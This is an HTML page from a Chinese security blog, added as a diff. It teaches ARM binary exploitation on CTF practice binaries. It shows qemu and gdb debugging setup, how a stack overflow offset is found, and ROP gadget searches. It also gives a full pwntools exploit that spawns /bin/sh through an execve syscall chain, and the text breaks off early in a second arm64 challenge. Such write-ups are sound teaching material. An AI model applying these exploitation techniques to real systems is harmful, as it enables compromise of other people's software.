@@ -1,0 +1,477 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="arm pwn start">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arm pwn入门">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="arm pwn start">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-27T07:16:46.000Z">
+<meta property="article:modified_time" content="2021-02-17T07:28:08.743Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary"><title>arm pwn入门 | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">arm pwn入门</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-01-27</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="qemu调试arm用户态程序"   >
+          <a href="#qemu调试arm用户态程序" class="heading-link"><i class="fas fa-link"></i></a><a href="#qemu调试arm用户态程序" class="headerlink" title="qemu调试arm用户态程序"></a>qemu调试arm用户态程序</h1>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用qemu-arm将程序运行起来，并指定一个端口用于连接gdb</span></span><br><span class="line">qemu-arm -g xxx ./arm-bin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用gdb-multiarch指定arm程序</span></span><br><span class="line">gdb-multiarch ./arm-bin</span><br><span class="line"><span class="meta">gef&gt;</span><span class="bash"> <span class="built_in">set</span> architecture arm</span></span><br><span class="line"><span class="meta">gef&gt;</span><span class="bash"> <span class="built_in">set</span> endian little</span></span><br><span class="line"><span class="meta">gef&gt;</span><span class="bash"> target remote :xxx</span></span><br></pre></td></tr></table></div></figure>
+<p>调试mips程序的设置也类似</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动mips应用程序，并指定调试端口</span></span><br><span class="line">qemu-mips -g xxx ./mips-bin</span><br><span class="line">qemu-mips -g xxx -L ./ ./mips-bin  # 使用-L指定包含动态库的lib/目录</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> gdb-multiarch启动调试</span></span><br><span class="line">gdb-multiatch ./mips-bin</span><br><span class="line"><span class="meta">gef&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips</span></span><br><span class="line"><span class="meta">gef&gt;</span><span class="bash"> <span class="built_in">set</span> endian big</span></span><br><span class="line"><span class="meta">gef&gt;</span><span class="bash"> target remote :xxx</span></span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="练习题-typo"   >
+          <a href="#练习题-typo" class="heading-link"><i class="fas fa-link"></i></a><a href="#练习题-typo" class="headerlink" title="练习题 - typo"></a>练习题 - typo</h1>
+      <p><a href="typo">typo</a></p>
+<p>查看文件属性，arm32位可执行程序，静态连接，去符号表。</p>
+<p>查看编译选项，栈无canary但栈不可执行，程序未开启随机化故加载基址固定。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bling@Ubuntu2004:~/ctf$ file ./typo</span><br><span class="line">./typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line"></span><br><span class="line">bling@Ubuntu2004:~/ctf$ checksec --file=./typo</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH </span><br><span class="line">Symbols		FORTIFY	Fortified	Fortifiable  FILE</span><br><span class="line">No Symbols      No	0		0	./typo</span><br></pre></td></tr></table></div></figure>
+<p>通过start()函数或关键字符串的交叉引用来寻找main()函数。</p>
+<ul>
+<li><p>start函数中LDR R0,=sub_8F00中的sub_8F00就是main函数</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00008BB4                 PUSH    &#123;R12&#125;</span><br><span class="line">.text:00008BB8                 LDR     R0, =sub_8F00</span><br><span class="line">.text:00008BBC                 LDR     R3, =0xA5EC</span><br><span class="line">.text:00008BC0                 BL      sub_9EBC</span><br><span class="line">.text:00008BC4                 BL      sub_F0E0</span><br><span class="line">.text:00008BC4 ; End of function start</span><br></pre></td></tr></table></div></figure></li>
+<li><p>关键字符串，如运行时打印的<code>Let&#39;s Do Some Typing Exercise~</code>，在IDA中寻找对该字符串的引用</p>
+</li>
+</ul>
+
+        <h2 id="题目分析"   >
+          <a href="#题目分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2>
+      <p>对于这种输入类的题，首先想到的是输入一个超长字符串看程序会不会崩。果然崩掉了。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm ./typo</span></span><br><span class="line">Let&#x27;s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ if you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">consequently</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></div></figure>
+<p>使用gdb-multiarch调试一下崩溃位置，是否覆盖了返回地址</p>
+<ul>
+<li><p>qemu-arm侧</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -g 1234 ./typo</span></span><br></pre></td></tr></table></div></figure></li>
+<li><p>gdb-multiarch侧</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb-multiarch ./typo</span></span><br><span class="line">GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture arm</span></span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> endian little</span></span><br><span class="line">The target is assumed to be little endian</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote :1234</span></span><br><span class="line">Remote debugging using :1234</span><br></pre></td></tr></table></div></figure>
+<p>这里在gdb内设置的set和target remote都可以写在一个配置文档里，通过<code>gdb-multiarch -x abc.cfg</code>指定。</p>
+</li>
+<li><p>pwntools生成字符串pattern</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; cyclic(200)</span></span><br><span class="line">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27;</span><br></pre></td></tr></table></div></figure>
+<p>接下来：</p>
+</li>
+</ul>
+<ol>
+<li><p>gdb-multiarch内执行<code>c</code></p>
+</li>
+<li><p>qemu-arm界面，回车后，将上述200个字符输入</p>
+</li>
+<li><p>回到gdb-multiarch界面，可以看到如下寄存器信息，PC指针被我们的输入覆盖了</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> R0   0x0</span><br><span class="line">*R1   0xfffeeed4 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">*R2   0x7e</span><br><span class="line"> R3   0x0</span><br><span class="line">*R4   0x62616162 (&#x27;baab&#x27;)</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0xa5ec ◂— push   &#123;r3, r4, r5, r6, r7, r8, sb, lr&#125;</span><br><span class="line">*R10  0xa68c ◂— push   &#123;r3, r4, r5, lr&#125;</span><br><span class="line">*R11  0x62616163 (&#x27;caab&#x27;)</span><br><span class="line"> R12  0x0</span><br><span class="line">*SP   0xfffeef48 ◂— &#x27;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">*PC   0x62616164 (&#x27;daab&#x27;)</span><br></pre></td></tr></table></div></figure></li>
+<li><p>在pwntools中确定<code>&#39;daab&#39;</code>的偏移量，为112</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; cyclic_find(<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">112</span><br></pre></td></tr></table></div></figure></li>
+<li><p>因此，我们通过padding 112个字符，就能覆盖函数返回地址，劫持控制流</p>
+</li>
+</ol>
+
+        <h2 id="三种利用方法"   >
+          <a href="#三种利用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#三种利用方法" class="headerlink" title="三种利用方法"></a>三种利用方法</h2>
+      
+        <h3 id="ret2shellcode"   >
+          <a href="#ret2shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3>
+      <blockquote>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >现成的shellcode</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+
+        <h3 id="rop-svc"   >
+          <a href="#rop-svc" class="heading-link"><i class="fas fa-link"></i></a><a href="#rop-svc" class="headerlink" title="rop - svc"></a>rop - svc</h3>
+      <blockquote>
+<p>svc：id=0xb；R0=addr(“/bin/sh”)；R1=0；R2=0 </p>
+<p>以上系统调用等同于execve(“/bin/sh”,0,0)</p>
+</blockquote>
+<p>找到<code>/bin/sh</code>字符串地址：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ./typo --string /bin/sh</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0006c384 : /bin/sh</span><br></pre></td></tr></table></div></figure>
+<p>找ropgadget：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ./typo --only <span class="string">&quot;pop&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00008d1c : pop &#123;fp, pc&#125;</span><br><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br><span class="line">0x00068bec : pop &#123;r1, pc&#125;</span><br><span class="line">0x00008160 : pop &#123;r3, pc&#125;</span><br><span class="line">0x0000ab0c : pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x0000a958 : pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x00008a3c : pop &#123;r3, r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x0000a678 : pop &#123;r3, r4, r5, r6, r7, r8, sb, pc&#125;</span><br><span class="line">0x00008520 : pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x00068c68 : pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x00014a70 : pop &#123;r3, r4, r7, pc&#125;</span><br><span class="line">0x00008de8 : pop &#123;r4, fp, pc&#125;</span><br><span class="line">0x000083b0 : pop &#123;r4, pc&#125;</span><br><span class="line">0x00008eec : pop &#123;r4, r5, fp, pc&#125;</span><br><span class="line">0x00009284 : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000242e0 : pop &#123;r4, r5, r6, fp, pc&#125;</span><br><span class="line">0x000095b8 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x000212ec : pop &#123;r4, r5, r6, r7, fp, pc&#125;</span><br><span class="line">0x000082e8 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x00043110 : pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x00011648 : pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x00048e9c : pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;</span><br><span class="line">0x0000a5a0 : pop &#123;r4, r5, r6, r7, r8, sb, pc&#125;</span><br><span class="line">0x0000870c : pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x00011c24 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">0x000553cc : pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x00023ed4 : pop &#123;r4, r5, r7, pc&#125;</span><br><span class="line">0x00023dbc : pop &#123;r4, r7, pc&#125;</span><br><span class="line">0x00014068 : pop &#123;r7, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 29</span><br></pre></td></tr></table></div></figure>
+<p>找<code>svc</code>：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ./typo | grep <span class="string">&#x27;svc #0&#x27;</span></span></span><br><span class="line">0x0001aca8 : svc #0 ; pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x00019568 : svc #0 ; pop &#123;r4, r5, r6, r7, r8, sb, pc&#125;</span><br><span class="line">0x000482fc : svc #0 ; pop &#123;r7&#125; ; bx lr</span><br><span class="line">0x00048310 : svc #0 ; pop &#123;r7&#125; ; bx lr ; str r7, [sp, #-4]! </span><br><span class="line">0x000482fc : svc #0 ; pop &#123;r7&#125; ; bx lr ; str r7, [sp, #-4]! </span><br><span class="line">0x00048324 : svc #0 ; pop &#123;r7&#125; ; bx lr ; str r7, [sp, #-4]! </span><br><span class="line">......</span><br></pre></td></tr></table></div></figure>
+<p>找<code>mov</code>指令：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ./typo | grep <span class="string">&#x27;mov r2, r4&#x27;</span></span></span><br><span class="line">0x0003338c : mov r2, r4 ; blx r3</span><br><span class="line">0x0000f600 : mov r2, r4 ; blx sb</span><br><span class="line">0x00069950 : mov r2, r4 ; mov r3, r4 ; blx r8</span><br><span class="line">0x00013310 : mov r2, r4 ; mov r3, r5 ; blx r1</span><br><span class="line">......</span><br></pre></td></tr></table></div></figure>
+<p>我们的最终目标是：</p>
+<ul>
+<li>R0 = “/bin/sh”</li>
+<li>R1 = 0</li>
+<li>R2 = 0</li>
+<li>R7 = 0xb （对应arm下execve的系统调用）</li>
+<li>Rx = svc</li>
+</ul>
+<p>根据目标，构造了如下rop链：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">g1 - 0x00020904 : pop &#123;r0, r4, pc&#125;</span><br><span class="line">g2 - 0x00068bec : pop &#123;r1, pc&#125;</span><br><span class="line">g3 - 0x00023dbc : pop &#123;r4, r7, pc&#125;</span><br><span class="line">g4 - 0x00008160 : pop &#123;r3, pc&#125;</span><br><span class="line">g5 - 0x0003338c : mov r2, r4 ; blx r3</span><br><span class="line">====stack high====</span><br><span class="line">g5</span><br><span class="line">0x0001aca8		# &quot;svc&quot;地址</span><br><span class="line">g4</span><br><span class="line">0xb</span><br><span class="line">0</span><br><span class="line">g3</span><br><span class="line">0</span><br><span class="line">g2</span><br><span class="line">0</span><br><span class="line">0x0006c384		# &quot;/bin/sh&quot;字符串地址</span><br><span class="line">g1</span><br><span class="line">====stack low====</span><br></pre></td></tr></table></div></figure>
+<p>以上rop链对应的payload为：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)</span><br></pre></td></tr></table></div></figure>
+<p>完整exp如下：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;arm&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">myproc = process([&#x27;qemu-arm&#x27;,&#x27;./typo&#x27;])</span><br><span class="line"></span><br><span class="line">myproc.recvuntil(&quot;quit\n&quot;)</span><br><span class="line">myproc.send(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">payload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)</span><br><span class="line">exp = &#x27;a&#x27;*112 + payload</span><br><span class="line"></span><br><span class="line">myproc.recv()</span><br><span class="line">myproc.sendline(exp)</span><br><span class="line"></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="rop-func-“-bin-sh”"   >
+          <a href="#rop-func-“-bin-sh”" class="heading-link"><i class="fas fa-link"></i></a><a href="#rop-func-“-bin-sh”" class="headerlink" title="rop - func(“/bin/sh”)"></a>rop - func(“/bin/sh”)</h3>
+      <blockquote>
+<p>system(“/bin/sh”) 或者 execve(“/bin/sh”,0,0)</p>
+<p>使用类似pop {r0,pc}的gadget，实现对r0（第一个参数）和pc的控制，从而劫持控制流到<strong>system(“/bin/sh”)</strong></p>
+</blockquote>
+
+        <h1 id="练习题-pwn"   >
+          <a href="#练习题-pwn" class="heading-link"><i class="fas fa-link"></i></a><a href="#练习题-pwn" class="headerlink" title="练习题 - pwn"></a>练习题 - pwn</h1>
+      
+        <h2 id="安装arm64的lib库"   >
+          <a href="#安装arm64的lib库" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装arm64的lib库" class="headerlink" title="安装arm64的lib库"></a>安装arm64的lib库</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br><span class="line">sudo apt install libc6-arm64-cross</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装好的库/usr/aarch64-linux-gnu/lib/目录下</span></span><br></pre></td></tr></table></div></figure>
+<p><code>qemu-aarch64</code>执行时通过<code>-L</code>指定<code>/usr/aarch64-linux-gnu</code>目录即可，如：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="题目分析-1"   >
+          <a href="#题目分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2>
+      <p><a href="pwn">pwn</a></p>
+<p>查看文件属性、IDA逆向二进制文件分析后，调试结果如下：</p>
+<ul>
+<li><p>程序有两次输入。第一次输入将被放到bss段，限制了输入大小为0x200。这里没有问题。</p>
+</li>
+<li><p>第二次输入时，将输入0x200字节的数据给栈上的局部变量。如下所示，明显的栈溢出。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_4007F0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
